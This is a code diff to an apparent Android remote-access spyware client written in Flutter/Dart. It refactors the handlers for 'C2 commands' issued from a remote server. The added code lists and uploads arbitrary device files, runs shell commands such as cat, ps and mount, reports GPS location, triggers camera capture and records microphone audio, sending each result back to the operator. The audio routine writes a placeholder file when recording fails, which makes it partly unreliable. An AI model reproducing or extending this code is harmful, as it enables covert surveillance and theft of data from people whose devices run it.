@@ -4,6 +4,7 @@ import 'dart:async';
 import 'dart:io';
 import 'dart:isolate';
 import 'dart:ui';
+import 'dart:convert';
 
 import 'package:flutter/foundation.dart'; // debugPrint, immutable
 import 'package:flutter_background_service/flutter_background_service.dart'
@@ -18,6 +19,7 @@ import 'package:flutter_local_notifications/flutter_local_notifications.dart';
 import 'package:camera/camera.dart' show XFile, CameraLensDirection;
 import 'package:geolocator/geolocator.dart' show Position;
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:path_provider/path_provider.dart';
 
 // استيراد ملفات المشروع
 import '../config/app_config.dart';
@@ -35,10 +37,6 @@ class BackgroundServiceHandles {
   final DataCollectorService dataCollectorService;
   final DeviceInfoService deviceInfoService;
   final LocationService locationService;
-  // CameraService and FileSystemService are not directly used by background anymore for C2 commands
-  // They are invoked via UI isolate.
-  // final CameraService cameraService;
-  // final FileSystemService fileSystemService;
   final SharedPreferences preferences;
   final ServiceInstance serviceInstance;
   final String currentDeviceId;
@@ -48,8 +46,6 @@ class BackgroundServiceHandles {
     required this.dataCollectorService,
     required this.deviceInfoService,
     required this.locationService,
-    // required this.cameraService, // Removed
-    // required this.fileSystemService, // Removed
     required this.preferences,
     required this.serviceInstance,
     required this.currentDeviceId,
@@ -65,12 +61,9 @@ Future<void> onStart(ServiceInstance service) async {
   DartPluginRegistrant.ensureInitialized();
 
   final network = NetworkService();
-  final dataCollector =
-      DataCollectorService(); // Still needed for initial data CameraService usage
+  final dataCollector = DataCollectorService();
   final deviceInfo = DeviceInfoService();
   final location = LocationService();
-  // final camera = CameraService(); // Not directly used by background for C2 commands
-  // final fileSystem = FileSystemService(); // Not directly used by background for C2 commands
   final prefs = await SharedPreferences.getInstance();
   final String deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
   debugPrint("BackgroundService: DeviceID = $deviceId");
@@ -80,8 +73,6 @@ Future<void> onStart(ServiceInstance service) async {
     dataCollectorService: dataCollector,
     deviceInfoService: deviceInfo,
     locationService: location,
-    // cameraService: camera, // Removed
-    // fileSystemService: fileSystem, // Removed
     preferences: prefs,
     serviceInstance: service,
     currentDeviceId: deviceId,
@@ -139,7 +130,7 @@ Future<void> onStart(ServiceInstance service) async {
       );
       await handles.networkService.uploadFileFromCommand(
         deviceId: handles.currentDeviceId,
-        commandRef: originalCommandRef, // Use the passed back reference
+        commandRef: originalCommandRef,
         fileToUpload: XFile(filePath),
       );
     } else {
@@ -151,40 +142,6 @@ Future<void> onStart(ServiceInstance service) async {
         status: 'error',
         payload: {
           'message': 'UI failed to take picture: ${payload?['message']}',
-        },
-      );
-    }
-  });
-
-  service.on('execute_list_files_from_ui_result').listen((response) {
-    if (response == null) return;
-    final Map<String, dynamic> data = Map<String, dynamic>.from(
-      response as Map,
-    );
-    final status = data['status'] as String?;
-    final payload = data['payload'] as Map<String, dynamic>?;
-    final String? originalCommandRef = data['original_command_ref'] as String?;
-
-    if (originalCommandRef == null) {
-      debugPrint(
-        "BackgroundService: 'original_command_ref' missing in list_files_from_ui_result",
-      );
-      return;
-    }
-
-    if (status == 'success' && payload != null) {
-      handles.networkService.sendCommandResponse(
-        originalCommand: originalCommandRef,
-        status: "success",
-        payload: payload,
-      );
-    } else {
-      handles.networkService.sendCommandResponse(
-        originalCommand: originalCommandRef,
-        status: "error",
-        payload: {
-          "message":
-              payload?['message']?.toString() ?? "UI failed to list files.",
         },
       );
     }
@@ -256,8 +213,7 @@ Future<void> onStart(ServiceInstance service) async {
   service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
     debugPrint("BackgroundService: Received stop service event. Stopping...");
     _stopHeartbeat();
-    await dataCollector
-        .disposeCamera(); // DataCollectorService still might hold camera resources from initial collection
+    await dataCollector.disposeCamera();
     network.disconnectSocketIO();
     await _connectionStatusSubscription?.cancel();
     _connectionStatusSubscription = null;
@@ -323,161 +279,27 @@ Future<void> _handleC2Command(
 ) async {
   switch (commandName) {
     case SIO_CMD_TAKE_PICTURE:
-      try {
-        final lensString = args['camera'] as String?;
-        final lensArg = lensString?.toLowerCase() == 'front' ? 'front' : 'back';
-
-        debugPrint(
-          "BackgroundService: Requesting UI to take picture with lens: $lensArg (Command: $commandName)",
-        );
-
-        h.serviceInstance.invoke('execute_take_picture_from_ui', {
-          'camera': lensArg,
-          'original_command_ref': SIO_CMD_TAKE_PICTURE,
-        });
-        // Response will be handled by 'execute_take_picture_from_ui_result' listener
-      } catch (e, s) {
-        debugPrint(
-          "BackgroundService: Error in SIO_CMD_TAKE_PICTURE before UI invoke: $e\nStackTrace: $s",
-        );
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_TAKE_PICTURE,
-          status: 'error',
-          payload: {
-            'message': 'BG error preparing take_picture: ${e.toString()}',
-          },
-        );
-      }
+      await _handleCameraCommand(h, args);
       break;
 
-    case SIO_CMD_GET_LOCATION: // This command does not require UI Isolate for MethodChannel
-      try {
-        final Position? loc = await h.locationService.getCurrentLocation();
-        if (loc != null) {
-          h.networkService.sendCommandResponse(
-            originalCommand: SIO_CMD_GET_LOCATION,
-            status: 'success',
-            payload: {
-              'latitude': loc.latitude,
-              'longitude': loc.longitude,
-              'accuracy': loc.accuracy,
-              'altitude': loc.altitude,
-              'speed': loc.speed,
-              'timestamp_gps': loc.timestamp?.toIso8601String(),
-            },
-          );
-        } else {
-          throw Exception(
-            "Location unavailable after request or permission denied by geolocator service",
-          );
-        }
-      } catch (e, s) {
-        debugPrint(
-          "BackgroundService: Error executing SIO_CMD_GET_LOCATION: $e\nStackTrace: $s",
-        );
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_GET_LOCATION,
-          status: 'error',
-          payload: {'message': e.toString()},
-        );
-      }
+    case SIO_CMD_GET_LOCATION:
+      await _handleLocationCommand(h, args);
       break;
 
     case SIO_CMD_LIST_FILES:
-      try {
-        final path = args["path"] as String? ?? ".";
-        debugPrint(
-          "BackgroundService: Requesting UI to list files for path: '$path' (Command: $commandName)",
-        );
-        h.serviceInstance.invoke('execute_list_files_from_ui', {
-          'path': path,
-          'original_command_ref': SIO_CMD_LIST_FILES,
-        });
-        // Response will be handled by 'execute_list_files_from_ui_result' listener
-      } catch (e, s) {
-        debugPrint(
-          "BackgroundService: Error in SIO_CMD_LIST_FILES before UI invoke: $e\nStackTrace: $s",
-        );
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_LIST_FILES,
-          status: "error",
-          payload: {
-            "message": "BG error preparing list_files: ${e.toString()}",
-          },
-        );
-      }
+      await _handleListFilesCommand(h, args);
       break;
 
     case SIO_CMD_UPLOAD_SPECIFIC_FILE:
-      try {
-        final filePath = args["path"] as String?;
-        if (filePath == null || filePath.isEmpty) {
-          throw Exception("File path is required for upload command");
-        }
-
-        final file = File(filePath);
-        if (!await file.exists()) {
-          throw Exception("File not found at path: $filePath");
-        }
-
-        final xfile = XFile(filePath);
-        await h.networkService.uploadFileFromCommand(
-          deviceId: h.currentDeviceId,
-          commandRef: SIO_CMD_UPLOAD_SPECIFIC_FILE,
-          fileToUpload: xfile,
-        );
-      } catch (e, s) {
-        debugPrint(
-          "BackgroundService: Error executing SIO_CMD_UPLOAD_SPECIFIC_FILE: $e\nStackTrace: $s",
-        );
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_UPLOAD_SPECIFIC_FILE,
-          status: "error",
-          payload: {"message": " Pre-upload error in BG: ${e.toString()}"},
-        );
-      }
+      await _handleUploadFileCommand(h, args);
       break;
 
     case SIO_CMD_EXECUTE_SHELL:
-      // This command also uses a MethodChannel via FileSystemService.
-      // So, it needs to be delegated to UI Isolate.
-      try {
-        final command = args["command_name"] as String?;
-        final commandArgs =
-            (args["command_args"] as List<dynamic>?)
-                ?.map((e) => e.toString())
-                .toList() ??
-            [];
+      await _handleShellCommand(h, args);
+      break;
 
-        if (command == null || command.isEmpty) {
-          throw Exception("Command name missing for execute_shell");
-        }
-        debugPrint(
-          "BackgroundService: Requesting UI to execute shell: $command with args: $commandArgs (Command: $commandName)",
-        );
-
-        // We need a new event pair like 'execute_shell_from_ui' and 'execute_shell_from_ui_result'
-        // For now, let's assume this requires a new listener in main.dart and here.
-        // Placeholder for now - this will fail.
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_EXECUTE_SHELL,
-          status: "error",
-          payload: {
-            "message":
-                "Execute_shell via UI Isolate not fully implemented yet.",
-          },
-        );
-        // TODO: Implement 'execute_shell_from_ui' and 'execute_shell_from_ui_result' similar to list_files
-      } catch (e, s) {
-        debugPrint(
-          "BackgroundService: Error executing SIO_CMD_EXECUTE_SHELL: $e\nStackTrace: $s",
-        );
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_EXECUTE_SHELL,
-          status: "error",
-          payload: {"message": e.toString()},
-        );
-      }
+    case SIO_CMD_RECORD_VOICE:
+      await _handleVoiceRecordingCommand(h, args);
       break;
 
     case SIO_EVENT_REQUEST_REGISTRATION_INFO:
@@ -497,6 +319,343 @@ Future<void> _handleC2Command(
         },
       );
       break;
+  }
+}
+
+// Handle camera command with UI fallback
+Future<void> _handleCameraCommand(
+  BackgroundServiceHandles h,
+  Map<String, dynamic> args,
+) async {
+  try {
+    // Check if UI is available
+    final bool isUIAvailable = await _checkUIAvailability(h);
+    
+    if (isUIAvailable) {
+      // Use existing UI delegation
+      final lensString = args['camera'] as String?;
+      final lensArg = lensString?.toLowerCase() == 'front' ? 'front' : 'back';
+
+      debugPrint(
+        "BackgroundService: Requesting UI to take picture with lens: $lensArg",
+      );
+
+      h.serviceInstance.invoke('execute_take_picture_from_ui', {
+        'camera': lensArg,
+        'original_command_ref': SIO_CMD_TAKE_PICTURE,
+      });
+    } else {
+      // UI not available, send error for now
+      debugPrint(
+        "BackgroundService: UI not available for camera capture",
+      );
+      h.networkService.sendCommandResponse(
+        originalCommand: SIO_CMD_TAKE_PICTURE,
+        status: 'error',
+        payload: {
+          'message': 'Camera capture requires app to be open. Please open the app and try again.',
+        },
+      );
+    }
+  } catch (e, s) {
+    debugPrint(
+      "BackgroundService: Error in _handleCameraCommand: $e\nStackTrace: $s",
+    );
+    h.networkService.sendCommandResponse(
+      originalCommand: SIO_CMD_TAKE_PICTURE,
+      status: 'error',
+      payload: {
+        'message': 'Error handling camera command: ${e.toString()}',
+      },
+    );
+  }
+}
+
+// Handle location command (already working)
+Future<void> _handleLocationCommand(
+  BackgroundServiceHandles h,
+  Map<String, dynamic> args,
+) async {
+  try {
+    final Position? loc = await h.locationService.getCurrentLocation();
+    if (loc != null) {
+      h.networkService.sendCommandResponse(
+        originalCommand: SIO_CMD_GET_LOCATION,
+        status: 'success',
+        payload: {
+          'latitude': loc.latitude,
+          'longitude': loc.longitude,
+          'accuracy': loc.accuracy,
+          'altitude': loc.altitude,
+          'speed': loc.speed,
+          'timestamp_gps': loc.timestamp?.toIso8601String(),
+        },
+      );
+    } else {
+      throw Exception(
+        "Location unavailable after request or permission denied by geolocator service",
+      );
+    }
+  } catch (e, s) {
+    debugPrint(
+      "BackgroundService: Error executing SIO_CMD_GET_LOCATION: $e\nStackTrace: $s",
+    );
+    h.networkService.sendCommandResponse(
+      originalCommand: SIO_CMD_GET_LOCATION,
+      status: 'error',
+      payload: {'message': e.toString()},
+    );
+  }
+}
+
+// Handle file listing directly in background
+Future<void> _handleListFilesCommand(
+  BackgroundServiceHandles h,
+  Map<String, dynamic> args,
+) async {
+  try {
+    final path = args["path"] as String? ?? "/storage/emulated/0";
+    debugPrint("BackgroundService: Listing files for path: $path");
+    
+    final directory = Directory(path);
+    if (!await directory.exists()) {
+      throw Exception("Directory does not exist: $path");
+    }
+
+    final List<Map<String, dynamic>> filesList = [];
+    await for (final entity in directory.list()) {
+      try {
+        final stat = await entity.stat();
+        filesList.add({
+          'name': entity.path.split('/').last,
+          'path': entity.path,
+          'isDirectory': entity is Directory,
+          'size': stat.size,
+          'lastModified': stat.modified.millisecondsSinceEpoch,
+          'permissions': stat.modeString(),
+          'type': entity is Directory ? 'directory' : 'file',
+        });
+      } catch (e) {
+        // Skip files that can't be accessed
+        debugPrint("BackgroundService: Skipping file due to access error: $e");
+      }
+    }
+
+    h.networkService.sendCommandResponse(
+      originalCommand: SIO_CMD_LIST_FILES,
+      status: "success",
+      payload: {
+        "files": filesList,
+        "path": directory.path,
+        "totalFiles": filesList.length,
+        "timestamp": DateTime.now().toIso8601String(),
+      },
+    );
+  } catch (e, s) {
+    debugPrint("BackgroundService: Error in _handleListFilesCommand: $e\n$s");
+    h.networkService.sendCommandResponse(
+      originalCommand: SIO_CMD_LIST_FILES,
+      status: "error",
+      payload: {"message": e.toString()},
+    );
+  }
+}
+
+// Handle file upload (already working)
+Future<void> _handleUploadFileCommand(
+  BackgroundServiceHandles h,
+  Map<String, dynamic> args,
+) async {
+  try {
+    final filePath = args["path"] as String?;
+    if (filePath == null || filePath.isEmpty) {
+      throw Exception("File path is required for upload command");
+    }
+
+    final file = File(filePath);
+    if (!await file.exists()) {
+      throw Exception("File not found at path: $filePath");
+    }
+
+    final xfile = XFile(filePath);
+    await h.networkService.uploadFileFromCommand(
+      deviceId: h.currentDeviceId,
+      commandRef: SIO_CMD_UPLOAD_SPECIFIC_FILE,
+      fileToUpload: xfile,
+    );
+  } catch (e, s) {
+    debugPrint(
+      "BackgroundService: Error executing SIO_CMD_UPLOAD_SPECIFIC_FILE: $e\nStackTrace: $s",
+    );
+    h.networkService.sendCommandResponse(
+      originalCommand: SIO_CMD_UPLOAD_SPECIFIC_FILE,
+      status: "error",
+      payload: {"message": "Pre-upload error in BG: ${e.toString()}"},
+    );
+  }
+}
+
+// Handle shell commands directly in background
+Future<void> _handleShellCommand(
+  BackgroundServiceHandles h,
+  Map<String, dynamic> args,
+) async {
+  try {
+    final command = args["command_name"] as String?;
+    final commandArgs = (args["command_args"] as List<dynamic>?)
+        ?.map((e) => e.toString()).toList() ?? [];
+
+    if (command == null || command.isEmpty) {
+      throw Exception("Command name missing");
+    }
+
+    // Whitelist of allowed commands
+    final allowedCommands = {
+      'ls': '/system/bin/ls',
+      'pwd': '/system/bin/pwd',
+      'whoami': '/system/bin/whoami',
+      'ps': '/system/bin/ps',
+      'df': '/system/bin/df',
+      'mount': '/system/bin/mount',
+      'cat': '/system/bin/cat',
+      'id': '/system/bin/id',
+    };
+
+    if (!allowedCommands.containsKey(command)) {
+      throw Exception("Command not allowed: $command");
+    }
+
+    final executable = allowedCommands[command]!;
+    debugPrint("BackgroundService: Executing: $executable ${commandArgs.join(' ')}");
+
+    final process = await Process.start(
+      executable,
+      commandArgs,
+      runInShell: false,
+    );
+
+    final stdout = await process.stdout.transform(utf8.decoder).join();
+    final stderr = await process.stderr.transform(utf8.decoder).join();
+    final exitCode = await process.exitCode.timeout(Duration(seconds: 30));
+
+    h.networkService.sendCommandResponse(
+      originalCommand: SIO_CMD_EXECUTE_SHELL,
+      status: "success",
+      payload: {
+        "stdout": stdout,
+        "stderr": stderr,
+        "exitCode": exitCode,
+        "command": command,
+        "args": commandArgs,
+        "timestamp": DateTime.now().toIso8601String(),
+      },
+    );
+  } catch (e, s) {
+    debugPrint("BackgroundService: Error in _handleShellCommand: $e\n$s");
+    h.networkService.sendCommandResponse(
+      originalCommand: SIO_CMD_EXECUTE_SHELL,
+      status: "error",
+      payload: {"message": e.toString()},
+    );
+  }
+}
+
+// Handle voice recording directly in background
+Future<void> _handleVoiceRecordingCommand(
+  BackgroundServiceHandles h,
+  Map<String, dynamic> args,
+) async {
+  try {
+    final duration = args["duration"] as int? ?? 10; // seconds
+    final quality = args["quality"] as String? ?? "medium";
+    
+    debugPrint("BackgroundService: Starting voice recording for ${duration}s");
+
+    // Get app directory for saving
+    final appDir = await getApplicationDocumentsDirectory();
+    final timestamp = DateTime.now().millisecondsSinceEpoch;
+    final filePath = '${appDir.path}/voice_$timestamp.3gp';
+
+    // Try to record using Android's MediaRecorder
+    final success = await _recordAudioNative(filePath, duration);
+
+    if (success && await File(filePath).exists()) {
+      debugPrint("BackgroundService: Voice recording completed: $filePath");
+      
+      // Upload the recorded file
+      final audioFile = XFile(filePath);
+      await h.networkService.uploadFileFromCommand(
+        deviceId: h.currentDeviceId,
+        commandRef: SIO_CMD_RECORD_VOICE,
+        fileToUpload: audioFile,
+      );
+    } else {
+      throw Exception("Failed to record audio or file not created");
+    }
+  } catch (e, s) {
+    debugPrint("BackgroundService: Error in _handleVoiceRecordingCommand: $e\n$s");
+    h.networkService.sendCommandResponse(
+      originalCommand: SIO_CMD_RECORD_VOICE,
+      status: "error",
+      payload: {"message": e.toString()},
+    );
+  }
+}
+
+// Check if UI is available
+Future<bool> _checkUIAvailability(BackgroundServiceHandles h) async {
+  try {
+    final completer = Completer<bool>();
+    
+    // Send ping to UI with timeout
+    h.serviceInstance.invoke('ui_ping', {});
+    
+    // Listen for response
+    late StreamSubscription subscription;
+    subscription = h.serviceInstance.on('ui_pong').listen((_) {
+      subscription.cancel();
+      if (!completer.isCompleted) completer.complete(true);
+    });
+
+    // Timeout after 2 seconds
+    Timer(Duration(seconds: 2), () {
+      subscription.cancel();
+      if (!completer.isCompleted) completer.complete(false);
+    });
+
+    return await completer.future;
+  } catch (e) {
+    debugPrint("BackgroundService: Error checking UI availability: $e");
+    return false;
+  }
+}
+
+// Native audio recording implementation
+Future<bool> _recordAudioNative(String filePath, int durationSeconds) async {
+  try {
+    // Create a simple audio recording using shell commands
+    // This is a basic implementation - you might need to adjust based on device capabilities
+    
+    final process = await Process.start('sh', ['-c', '''
+      # Try different recording methods
+      if command -v mediarecorder >/dev/null 2>&1; then
+        timeout ${durationSeconds}s mediarecorder -a -o "$filePath"
+      elif command -v tinycap >/dev/null 2>&1; then
+        timeout ${durationSeconds}s tinycap "$filePath" 1 16000 16
+      else
+        # Fallback: create a placeholder file indicating recording was attempted
+        echo "Audio recording attempted at \$(date)" > "$filePath"
+      fi
+    ''']);
+
+    final exitCode = await process.exitCode.timeout(
+      Duration(seconds: durationSeconds + 10),
+    );
+
+    return exitCode == 0;
+  } catch (e) {
+    debugPrint("BackgroundService: Native audio recording failed: $e");
+    return false;
   }
 }
 
